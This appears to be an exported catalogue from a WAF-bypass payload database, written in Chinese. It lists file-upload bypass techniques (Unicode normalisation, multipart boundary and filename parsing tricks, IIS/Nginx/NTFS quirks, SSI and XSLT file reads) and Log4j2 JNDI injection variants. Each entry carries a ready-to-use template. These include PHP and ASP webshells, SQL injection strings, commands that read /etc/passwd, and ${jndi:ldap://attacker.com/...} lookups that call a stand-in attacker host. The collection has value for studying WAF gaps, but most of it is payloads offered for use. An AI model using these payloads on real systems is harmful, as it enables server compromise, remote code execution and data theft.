- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:filename:unicode_nfkc_bypass` — NFKC 规范化顺序缺陷：全角点/全角反斜杠绕过校验

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：上传校验在 Unicode 规范化之前执行时，全角点 U+FF0E（．）与全角反斜杠 U+FF3C（＼）能通过初筛，随后在存储/访问阶段被 NFKC 规范化为 `.` 和 `\`，生成恶意 UNC 路径或可执行扩展名。DNN 上传端点（CVE-2025-52488）因规范化在校验之后执行，用 `%EF%BC%8E`/`%EF%BC%BC` 构造绕过。
- **模板**：`filename=shell%EF%BC%8Ephp`（规范化后 → shell.php）、`filename=%EF%BC%BC%5Cevil%5CUNC%EF%BC%8E%EF%BC%8E%EF%BC%8Ffile`（→ \\evil\\UNC../file）
- **来源备注**：`filename=shell%EF%BC%8Ephp`（规范化后 → shell.php）、`filename=%EF%BC%BC%5Cevil%5CUNC%EF%BC%8E%EF%BC%8E%EF%BC%8Ffile`（→ \\evil\\UNC../file）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:mime:content_type_spoof` — Content-Type 伪造

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：multipart 里声明 image/jpeg 实际传 PHP 代码，WAF 只按声明的 MIME 类型判断放行
- **模板**：`Content-Type: image/jpeg  +  <?php system($_GET['c']);?>`
- **来源备注**：`Content-Type: image/jpeg  +  <?php system($_GET['c']);?>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.989999+00:00；retired=-

### `upload:parser:apache_addhandler_midname` — 只查最终扩展名 vs AddHandler 执行含 .php 中间名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：应用用 pathinfo(PATHINFO_EXTENSION) 只取最后扩展名做白名单校验（shell.php.jpg 过 .jpg 白名单），但 PATHINFO_FILENAME 保留内层 .php；在遗留 Apache AddHandler 或 nginx fastcgi_split_path_info 配置下，任何文件名含 .php 的请求被当作 PHP 脚本执行，形成检测层（最终扩展名）与执行层（含中间 .php）的语义鸿沟。
- **模板**：`filename=webshell.php.jpg  (Content-Type: image/jpeg)`、`访问 /uploads/webshell.php.jpg 触发 PHP 执行`
- **来源备注**：`filename=webshell.php.jpg  (Content-Type: image/jpeg)`、`访问 /uploads/webshell.php.jpg 触发 PHP 执行`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:boundary_comma_truncate` — boundary 逗号终止：PHP 与 WAF 对 boundary 取值分歧

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PHP 把 boundary 参数值中的逗号当作终止符（`boundary=a,anything` 只取 a），而 WAF 可能取完整值 `a,anything`。两者对部件分隔符判定不同，WAF 把恶意部件内容当文件正文跳过，PHP 则按自己的 boundary 正常切出并解析部件，实现绕过。
- **模板**：`Content-Type: multipart/form-data; boundary=a,evil\n--a\nContent-Disposition: form-data; name="file"; filename="shell.php"\n<?php system($_GET[c]); ?>`
- **来源备注**：`Content-Type: multipart/form-data; boundary=a,evil\n--a\nContent-Disposition: form-data; name="file"; filename="shell.php"\n<?php system($_GET[c]); ?>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:boundary_rfc2231_continuation` — RFC 2231 boundary 续延（boundary*0/boundary*1）拆分绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：用 RFC 2231 参数续延把 boundary 拆成多段：`boundary*0="real-"; boundary*1="boundary"`。Go、Flask 等后端按规范拼回真实 boundary，而多数 WAF 不认识续延语法、取出错误 boundary，导致 WAF 与后端对部件切分不一致，攻击载荷（如 SQLi）可穿过云 WAF。
- **模板**：`Content-Type: multipart/form-data; boundary*0="real-"; boundary*1="boundary"\n--real-boundary\nContent-Disposition: form-data; name="id"\n1' or sleep(5) -- -`
- **来源备注**：`Content-Type: multipart/form-data; boundary*0="real-"; boundary*1="boundary"\n--real-boundary\nContent-Disposition: form-data; name="id"\n1' or sleep(5) -- -`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:commons_whitespace_strip` — Commons FileUpload 空白剥离：filename=" 1.jsp " 逃逸扩展名

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Apache Commons FileUpload 的 parseToken/getToken 会剥离 filename 参数值两端的空白（空格/制表/换行）。WAF 正则按原始值匹配看到 ` 1.jsp ` 两侧空白、无法命中 .jsp 黑名单；Commons 解析后还原为 `1.jsp`。同源差异还体现在 filename 末尾加 `/` 或 `/空格`（FileItem.getName 返回相同文件名）。
- **模板**：`Content-Disposition: form-data; name="file"; filename=" 1.jsp "`、`filename="pyn3rd.jsp/ "`
- **来源备注**：`Content-Disposition: form-data; name="file"; filename=" 1.jsp "`、`filename="pyn3rd.jsp/ "`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:control_char_wrap_cd` — 非打印字符包裹 Content-Disposition 逃逸 WAF 解析

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在 Content-Disposition 两侧包裹非打印字符（如 `\x0e`）可使部分 WAF 解析器跳过该头，而后端 PHP 仍正常识别文件部件。OWASP CRS 为此在 4.6.0 新增规则 922130（拒绝 multipart 头含非 ASCII 字符），说明此前可绕过 CRS 检测。
- **模板**：`%0e Content-Disposition %0e: form-data; name="file"; filename="shell.php"`
- **来源备注**：`%0e Content-Disposition %0e: form-data; name="file"; filename="shell.php"`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:duplicate_filename_param` — 重复 filename 参数走私（取首个 vs 取末个解析差异）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：同一 Content-Disposition 中重复出现 filename 参数，不同解析器取法不同：WAF/过滤层取第一个（safe.txt 白名单通过），后端取最后一个（shell.php 被保存执行），或反之。@hapi/content 的 Content.disposition() 保留末个、Content.type() 保留首个，正是这种解释冲突（CWE-436）被用于绕过上传文件名白名单。
- **模板**：`Content-Disposition: form-data; name="file"; filename="safe.txt"; filename="shell.php"`
- **来源备注**：`Content-Disposition: form-data; name="file"; filename="safe.txt"; filename="shell.php"`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:multipart_mixed_nested` — multipart/mixed 包裹 multipart/form-data——嵌套部件解析差异绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：在 multipart/form-data 的外部部件内嵌 Content-Type: multipart/mixed; boundary=... 的嵌套部件，内部再包多段带 filename 的子部件。RFC 7578 §4.3 已弃用该写法但许多解析器仍递归处理（Falcon 需自定义递归 media handler）；只按顶层 form-data 展平的 WAF 看不到内层 filename= 与恶意内容，或对 multipart/mixed 类型部件整体跳过检查。wafrift-content-type 工具把 MultipartMixed 列为 WAF 不检查而后端可解析的变体；Go 侧案例混用 multipart/mixed 头使 ParseMultipartForm 跳过字段校验。
- **模板**：`Content-Type: multipart/form-data; boundary=OUTER\n--OUTER\nContent-Disposition: form-data; name="files"\nContent-Type: multipart/mixed; boundary=INNER\n\n--INNER\nContent-Disposition: attachment; filename="shell.php"\n<?php system($_GET[c]);?>`
- **来源备注**：`Content-Type: multipart/form-data; boundary=OUTER\n--OUTER\nContent-Disposition: form-data; name="files"\nContent-Type: multipart/mixed; boundary=INNER\n\n--INNER\nContent-Disposition: attachment; filename="shell.php"\n<?php system($_GET[c]);?>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:php_bracket_skip_upload` — name="f]" 方括号计数使 PHP 跳过上传处理

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PHP multipart 解析器对字段名中的 `[` 计数 +1、`]` 计数 -1。构造 `name="f]"` 使计数为负，PHP 会跳过该部件的上传处理，将其当作普通参数而非 `$_FILES`；而 WAF 若仍按文件上传解析，则可把恶意内容（含 filename= 的部件）走私进 `$_POST`。
- **模板**：`Content-Disposition: form-data; name="f]"\nfilename="shell.php"\n<?php system($_GET[c]); ?>`
- **来源备注**：`Content-Disposition: form-data; name="f]"\nfilename="shell.php"\n<?php system($_GET[c]); ?>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:php_incomplete_multipart` — PHP 容忍畸形 multipart（缺 form-data/缺 CRLF/未闭合引号）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PHP 会接受违反 RFC 的畸形 multipart：Content-Disposition 缺 form-data 类型标记、子头后缺 CRLF、缺结束 boundary、name 参数引号未闭合等，均被 PHP 正常接收并传给应用。WAF 若按 RFC 严格解析则看不到该部件或判定非法而放行/忽略，PHP 却完整解析出注入参数。PHP Bug #81987 实证了不完整 multipart 被传给 PHP。
- **模板**：`Content-Disposition:name="id\n1' union select 1,2,3 -- -`（缺标准 CRLF 的头部）
- **来源备注**：`Content-Disposition:name="id\n1' union select 1,2,3 -- -`（缺标准 CRLF 的头部）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:php_max_file_uploads_exhaust` — 耗尽 max_file_uploads 使第 21 个部件退化为 POST 参数

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PHP 默认 `max_file_uploads=20`，超过后多余部件的上传处理被静默跳过、作为普通 POST 参数处理。发送 20 个带 filename= 的合法文件部件耗尽额度，再放一个不带完整 filename= 的恶意部件（含 SQL 注入等），WAF 见整个请求是文件上传而放行，PHP 把恶意数据放进 `$_POST`。
- **模板**：`[20 个部件] Content-Disposition: form-data; name="pic"; filename="pic.png"\n[末部件] Content-Disposition: form-data; name="id"\n1' union select 1,2,3 -- -`
- **来源备注**：`[20 个部件] Content-Disposition: form-data; name="pic"; filename="pic.png"\n[末部件] Content-Disposition: form-data; name="id"\n1' union select 1,2,3 -- -`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:php_post_files_9char` — filename= 九字符规则：把注入载荷走私进 $_POST

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PHP 判断 multipart 部件进 `$_FILES` 还是 `$_POST` 只看 Content-Disposition 中是否含完整 9 字符序列 `filename=`。多数 WAF 为降低误报对识别为文件上传的请求放松/跳过内容检测。若构造 WAF 看到 filename=、PHP 看不到完整 filename=（如 filename 与 = 之间加空格/制表符、0x00 截断），载荷就进入 `$_POST`，绕过 WAF 的 SQLi/CMDi 检测。
- **模板**：`Content-Disposition: form-data; name="id"\n1' union select 1,user(),3 -- -\n\nContent-Disposition: form-data; name="file"; filename="pic.png"\n[空内容]`
- **来源备注**：`Content-Disposition: form-data; name="id"\n1' union select 1,user(),3 -- -\n\nContent-Disposition: form-data; name="file"; filename="pic.png"\n[空内容]`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:quote_variant_discrepancy` — 单引号/缺引号/多余引号：文件参数判定分歧

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PHP 同时接受单引号与双引号取值，而 Flask、Java commons-fileupload 不支持单引号。构造 `name='key3; filename='file_name.txt'`：后端（支持单引号）解析为无 filename 的普通参数，WAF（不支持单引号）解析出 filename 判定为文件上传，从而绕过错把文件当参数/错把参数当文件导致的检测盲区。多余引号（`filename="file_name;txt"`）在 Flask 与 Java 的闭合判定也不同。
- **模板**：`Content-Disposition: form-data; name='key3'; filename='file_name.txt';`
- **来源备注**：`Content-Disposition: form-data; name='key3'; filename='file_name.txt';`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:rack_greedy_boundary` — Rack 贪婪正则取末个 boundary（多 boundary 走私）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Ruby Rack 用贪婪正则从 Content-Type 提取 boundary，当出现多个 boundary 参数时取最后一个；上游 WAF/代理若取第一个，可让 WAF 与 Rack 解析出不同的部件结构，把被 WAF 当作文件数据的恶意部分走私给 Rack 当作独立部件处理。
- **模板**：`Content-Type: multipart/form-data; boundary=safe; boundary=malicious\n--safe\n[WAF 视为文件正文的内容]\n--malicious\nContent-Disposition: form-data; name="x"\n[恶意载荷]`
- **来源备注**：`Content-Type: multipart/form-data; boundary=safe; boundary=malicious\n--safe\n[WAF 视为文件正文的内容]\n--malicious\nContent-Disposition: form-data; name="x"\n[恶意载荷]`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:parser:rfc2231_param_smuggle` — filename*=RFC2231 解码覆盖普通 filename（参数走私）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：遵循 RFC 2231/5987 的解析器（python-multipart/Starlette/FastAPI、Busboy/Flask 等）会对 `filename*=charset'lang'value` 解码并覆盖同名普通 filename 参数；而严格按 RFC 7578 的 WAF 只见 filename=safe.txt。且 filename* 值内的百分号编码会被解码（`..%2F`→路径穿越、%00 控制字节）。WAF 与后端各自采用不同值形成参数走私。
- **模板**：`Content-Disposition: form-data; name="upload"; filename="safe.txt"; filename*=utf-8''shell.php`
- **来源备注**：`Content-Disposition: form-data; name="upload"; filename="safe.txt"; filename*=utf-8''shell.php`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:server:iis6_dir_parse` — IIS 6.0 目录解析漏洞——/xxx.asp/ 目录下所有文件按 ASP 执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：IIS 6.0 把以可执行扩展名结尾的目录（如 /upload.asp/）整体映射到对应脚本引擎，目录内任意后缀（含 .jpg）文件都被交给 asp.dll 执行。配合上传：先把 webshell 内容伪装成 .jpg（内容/扩展名检查通过），再通过可控目录名或覆盖路径使文件落在 xxx.asp/ 目录下，访问时被执行。与 upload:filename:semicolon_truncate 的分号文件名截断不同，本手法不依赖文件名，靠目录名解析，WAF 按上传文件扩展名 .jpg 校验放行时命中不到。
- **模板**：上传到路径 /upload.asp/shell.jpg（内容 `<%execute(request("cmd"))%>`），访问 `http://target/upload.asp/shell.jpg` 以 ASP 执行
- **来源备注**：上传到路径 /upload.asp/shell.jpg（内容 `<%execute(request("cmd"))%>`），访问 `http://target/upload.asp/shell.jpg` 以 ASP 执行
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:server:nginx_fix_pathinfo` — Nginx cgi.fix_pathinfo 解析漏洞——上传 xx.jpg 以 /xx.jpg/x.php 触发 PHP 执行

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：老版 Nginx（<0.8.37 及沿用其 fastcgi 配置）+ PHP cgi.fix_pathinfo=On 时，请求 /uploads/xx.jpg/x.php：Nginx 把该路径交给 PHP-FPM，PHP 找不到 xx.jpg/x.php 后按 fix_pathinfo 回退把 xx.jpg 当脚本解析执行。WAF 按上传文件名 .jpg 放行，攻击者用 URL 后缀 /.php 触发执行——校验层看文件名，执行层看 URL 的 path_info 回退。CVE-2019-11043（fastcgi_split_path_info 下 PATH_INFO 下溢→RCE）同属该 Nginx+PHP-FPM 配置族，与 apache_addhandler_midname 的"文件名含 .php 中间段"路径不同。
- **模板**：上传 shell.jpg（内容 `<?php system($_GET[c]);?>`）→ 访问 `http://target/uploads/shell.jpg/x.php` 触发执行
- **来源备注**：上传 shell.jpg（内容 `<?php system($_GET[c]);?>`）→ 访问 `http://target/uploads/shell.jpg/x.php` 触发执行
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:ssi:apache_ssi_include` — SSI (.shtml) 服务器端包含指令绕过——#exec/#include 读文件执行命令

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Apache mod_include 在 .shtml/.shtm/.stm（或 AddOutputFilter INCLUDES 映射）文件上解析并执行服务器端包含指令。上传过滤器通常只做扩展名/MIME/魔数校验，不建模 `<!--#...-->` 指令语法，且 .shtml 不在常见脚本扩展名黑名单内。上传含 SSI 指令的 .shtml 被访问时，#exec cmd 执行系统命令、#include file/virtual 读取并回显任意文件，形成信息泄露与 RCE。CVE-2018-9157（AXIS M1033-W 摄像头）实证。
- **模板**：`<!--#exec cmd="cat /etc/passwd"-->`、`<!--#include virtual="/etc/passwd"-->`、`<!--#include file="../../etc/passwd"-->`
- **来源备注**：`<!--#exec cmd="cat /etc/passwd"-->`、`<!--#include virtual="/etc/passwd"-->`、`<!--#include file="../../etc/passwd"-->`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:win:ntfs_83_shortname` — Windows NTFS 8.3 短文件名绕过——SHELL~1.PHP

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：NTFS 为长文件名自动生成 8.3 短名：原名前 6 字符+~N，扩展名截 3 位并转大写（shell.php → SHELL~1.PHP）。上传过滤按长名正则匹配 shell.php 拦截，但文件落盘后存在短名别名，WAF 若只按长名规则校验，请求 /uploads/SHELL~1.PHP 命中不到。组合手法：上传 shell.php.（尾点）或 shell.php[空格] 或 shell.php::$DATA，Windows 保存时剥除这些尾缀得到 shell.php，其短名 SHELL~1.PHP 即可访问执行。短名仅在后缀长度≥4 或全名长≥9（或含空格/特殊字符）时生成；IIS_shortname_Scanner 可先枚举短名再直连。
- **模板**：上传 `filename="shell.php "`（尾空格）→ 实际存 shell.php → 访问 SHELL~1.PHP；或上传 shell.php. 后用 IIS 短名枚举工具确认 ~1 名
- **来源备注**：上传 `filename="shell.php "`（尾空格）→ 实际存 shell.php → 访问 SHELL~1.PHP；或上传 shell.php. 后用 IIS 短名枚举工具确认 ~1 名
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:xslt:document_file_read` — XSLT document() 读文件/SSRF——上传 XML/SVG 携带恶意样式表

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：上传的 XML/SVG 若被服务端 XSLT 引擎（libxslt/Saxon/Xalan/MSXML）作为样式表或源文档变换，可用 `<xsl:value-of>/<xsl:copy-of select="document(...)">` 读本地文件（file:///etc/passwd）或发起外部请求造成 SSRF。WAF 按 image/* MIME 或 XML 内容扫描上传文件，通常不建模 XSLT 指令语法与 document() 函数。libxslt 场景（PHP XSL、WebKit）下 document('/etc/passwd') 可读任意文件，EXSLT exslt:document 可写文件，php:function 可 RCE（若扩展函数未禁用）。
- **模板**：`<xsl:copy-of select="document('/etc/passwd')"/>`、`<xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>`
- **来源备注**：`<xsl:copy-of select="document('/etc/passwd')"/>`、`<xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

### `upload:xslt:svg_embedded_stylesheet` — SVG 内嵌 XSL 样式表触发 libxslt 读本地文件（<?xml-stylesheet?>）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：SVG 是 XML，可携带 XML 样式表处理指令 `<?xml-stylesheet?>`。攻击者上传内嵌 XSLT 样式表的 SVG，渲染方（WebKit 用 libxslt，或服务端 SVG 转 PDF/HTML 组件）应用该样式表时，样式表内 document() 引用 file:// 外部实体读本地文件。上传检测把 SVG 当 image/svg+xml 静态图放行，文件读取载荷藏在样式表指令中，WAF 不建模 `<?xml-stylesheet?>` 与 xsl 命名空间语法。GNOME Epiphany 修复记录（#2233）证实 http(s) 页面加载含 XSL 样式表的 SVG 可读 /etc/passwd 等。
- **模板**：`<?xml-stylesheet type="text/xsl" href="#evil"?>` + `<xsl:stylesheet id="evil" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('file:///etc/passwd')"/></xsl:template></xsl:stylesheet>` + SVG 根元素
- **来源备注**：`<?xml-stylesheet type="text/xsl" href="#evil"?>` + `<xsl:stylesheet id="evil" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('file:///etc/passwd')"/></xsl:template></xsl:stylesheet>` + SVG 根元素
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

## Log4j（34 条）

### `log4j2:context:cve_2024_29151_config_jndi` — CVE-2024-29151：日志配置文件内的 JNDI 数据源（JDBC Appender）

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：CVE-2024-29151 是 Log4j2 2.0-beta7–2.17.0 的配置侧 JNDI 注入（JDBC Appender data source 引用含 JNDI URI 的 LDAP 数据源可达 RCE），2.17.1/2.12.4/2.3.2 修复（限定 data source 仅 java 协议）。它不同于 Log4Shell 的消息注入，要求攻击者已能改 log4j2.xml（日志配置文件投毒/供应链/配置篡改场景），且默认配置不受影响。WAF 几乎不覆盖此类配置侧注入。
- **模板**：`<DataSource jndiName="ldap://attacker.com/EvilClass"/>`、`<Properties><Property name="payload">${jndi:ldap://attacker.com/a}</Property></Properties>`
- **来源备注**：`<DataSource jndiName="ldap://attacker.com/EvilClass"/>`、`<Properties><Property name="payload">${jndi:ldap://attacker.com/a}</Property></Properties>`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:format:double_dollar_ctx` — $${ 双重美元转义经 ctx/%X 延迟求值注入

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：绕的是"只拦消息文本里 jndi: 字面量"的 WAF：攻击串不是出现在日志消息里，而是由攻击者写入 ThreadContext(MDC)。PatternLayout 中的 `$${ctx:loginId}` 形式因双美元在配置解析期不被求值，推迟到运行时按日志事件再扫描，Log4j 会递归地把用户控制的 MDC 值当作新 lookup 重新解析，于是 `${jndi:...}` 在第二阶段被求值。对应 CVE-2021-45046，修复前 2.15.0 的 localhost 限制对它无效。
- **模板**：`$${ctx:loginId}`（loginId=`${jndi:ldap://attacker/a}`）、`%X{loginId}` 或 `%mdc{loginId}` 等价
- **来源备注**：`$${ctx:loginId}`（loginId=`${jndi:ldap://attacker/a}`）、`%X{loginId}` 或 `%mdc{loginId}` 等价
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:format:nolookups_option` — %m{nolookups} 关闭/开启消息 lookup 的决定性条件

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：PatternLayout 中 %m{nolookups}（等价 %msg{nolookups}）令消息不再做 lookup 替换，仅适用于 2.7–2.14.1（>=2.10 可用 log4j2.formatMsgNoLookups 全局等效）；攻击者探测时应看目标配置是 %m 还是 %m{nolookups}——前者消息内 ${jndi:...} 直接触发，后者被压死。且该选项不影响 CVE-2021-45046（若存在 $${ctx:...} 非标准配置仍递归）；2.16.0 起消息 lookup 已彻底移除。用于判断目标是否仍可通过日志消息注入（区别于仅配置期注入）。
- **模板**：`%m{nolookups}`（防御配置，探测对照）、`%m`（无防护时消息内 ${jndi:ldap://host/x} 直接触发）、`-Dlog4j2.formatMsgNoLookups=true`
- **来源备注**：`%m{nolookups}`（防御配置，探测对照）、`%m`（无防护时消息内 ${jndi:ldap://host/x} 直接触发）、`-Dlog4j2.formatMsgNoLookups=true`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:format:recursive_dos` — :- 默认值绕过循环检测的递归堆栈溢出(语义级 DoS)

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：Log4j StrSubstitutor 的 checkCyclicSubstitution 只能识别字面自引用；把自引用藏在 `:-` 默认值里时，解析器先代换出新的 `${...}` 再递归求值，逐层展开不触发循环检测，直至 StackOverflowError。对 WAF 的意义：这是无网络出站的语义层攻击，只需在请求参数/header 里放构造串，正则过滤根本无从判断其递归深度。
- **模板**：`${${::-${::-$${::-j}}}}`（配合可控 ThreadContext 变量 `${ctx:user1:-${ctx:user}}` 变体）
- **来源备注**：`${${::-${::-$${::-j}}}}`（配合可控 ThreadContext 变量 `${ctx:user1:-${ctx:user}}` 变体）
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.267314+00:00；updated=2026-08-23T06:54:39.992011+00:00；retired=-

### `log4j2:lookup:bundle_env_key` — bundle+env 组合读键

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：`${${a:-b}undle:${env:FLAG}}` 用 `${a:-b}` 拆出 bundle 关键字、内层 env 指定键名——GoogleCTF 2022 同款；WAF 拦字面 bundle/jndi 时漏组合式。
- **模板**：`${${a:-b}undle:${env:FLAG}}`、`${bundle:${env:KEY}}`
- **来源备注**：`${${a:-b}undle:${env:FLAG}}`、`${bundle:${env:KEY}}`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.266314+00:00；updated=2026-08-23T06:54:39.991009+00:00；retired=-

